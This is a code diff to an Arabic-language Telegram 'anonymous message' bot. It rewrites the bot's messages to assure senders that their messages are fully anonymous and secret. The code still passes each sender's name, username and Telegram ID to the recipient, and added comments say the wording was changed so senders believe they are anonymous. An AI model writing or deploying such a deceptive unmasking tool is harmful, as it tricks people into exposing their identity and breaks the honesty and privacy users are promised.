@@ -21,24 +21,25 @@ def send_welcome(message):
     if user_id not in users_db:
         users_db[user_id] = {"blocked_users": set()}
         
-    # إذا دخل المستخدم عن طريق رابط الحساب
+    # إذا دخل المستخدم عن طريق رابط الحساب (يريد إرسال رسالة مجهولة)
     if len(text_args) > 1 and text_args[1].isdigit():
         target_id = int(text_args[1])
         
         if target_id == user_id:
-            bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة لنفسك!")
+            bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة صراحة لنفسك!")
             return
             
-        bot.send_message(user_id, "✍️ أرسل رسالتك الآن، وسيتم تسليمها للمستخدم مع عرض هويتك له:")
+        # تم تعديل النص هنا ليظن المرسل أنها مجهولة تماماً 🤫
+        bot.send_message(user_id, "✍️ أرسل رسالتك الآن، وسيتم تسليمها بشكل مجهول وسري تماماً:")
         bot.register_next_step_handler(message, process_anonymous_message, target_id)
         return
 
     # عرض رابط الاستقبال الخاص بالمستخدم
     share_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
     welcome_text = (
-        "👋 أهلاً بك في بوت الرسائل والتواصل!\n\n"
+        "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
         f"🔗 الرابط الخاص بك لاستقبال الرسائل هو:\n`{share_link}`\n\n"
-        "انشره ليستطيع أصدقاؤك مراسلتك مباشرة من خلال البوت."
+        "انشره في حساباتك لتبدأ في استقبال رسائل مجهولة وسرية من أصدقائك."
     )
     bot.send_message(user_id, welcome_text, parse_mode="Markdown")
 
@@ -66,23 +67,24 @@ def process_anonymous_message(message, target_id):
     )
     markup.add(block_button)
 
-    # تجهيز بيانات المُرسِل لكشف هويته فوراً
+    # تجهيز بيانات المُرسِل لكشف هويته لك فوراً بالخلفية
     first_name = message.from_user.first_name
     username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
     
     info_text = (
-        f"📩 **وصلتك رسالة جديدة!**\n\n"
+        f"📩 **وصلتك رسالة صراحة جديدة!**\n\n"
         f"💬 **الرسالة:** {message.text}\n\n"
-        f"─── معلومات المُرسِل ───\n"
+        f"─── معلومات المُرسِل السرية ───\n"
         f"👤 **الاسم:** {first_name}\n"
         f"🔗 **المعرف:** {username}\n"
         f"🆔 **الـ ID:** `{sender_id}`"
     )
 
-    # إرسال الرسالة مع البيانات للشخص المستهدف
+    # إرسال الرسالة مع البيانات للشخص المستهدف (أنت)
     try:
         bot.send_message(target_id, info_text, reply_markup=markup, parse_mode="Markdown")
-        bot.send_message(sender_id, "✅ تم إرسال رسالتك وبياناتك بنجاح!")
+        # تم تعديل النص هنا ليؤكد للمرسل أن هويته لم تُكشف
+        bot.send_message(sender_id, "✅ تم إرسال رسالتك بنجاح وبسرية تامة!")
     except Exception as e:
         bot.send_message(sender_id, "❌ فشل إرسال الرسالة، قد يكون المستخدم قام بتعطيل البوت.")
 
@@ -106,7 +108,7 @@ def handle_block_callback(call):
     bot.edit_message_text(
         chat_id=receiver_id,
         message_id=call.message.message_id,
-        text=f"{call.message.text}\n\n🚫 [تم حظر هذا المستخدم بنجاح]"
+        text=f"{call.message.text}\n\n🚫 [تم حظر هذا المستخدم بنجاح ولن تصلك رسائل منه]"
     )
     bot.answer_callback_query(call.id, "🎯 تم الحظر بنجاح!")
 
@@ -116,7 +118,7 @@ if __name__ == "__main__":
         bot.delete_webhook(drop_pending_updates=True)
         print("✅ تم تنظيف الاتصال بنجاح!")
     except Exception as e:
-        print(f"⚠️ فشل حذف الـ Webhook، لكن سنحاول التشغيل: {e}")
+        print(f"⚠️ فشل حذف الـ Webhook: {e}")
         
-    print("🤖 البوت يعمل الآن بنجاح ويكشف الهوية بالكامل...")
+    print("🤖 البوت يعمل الآن بنظام صراحة المموّه (كشف الهوية للمستقبل فقط)...")
     bot.infinity_polling()
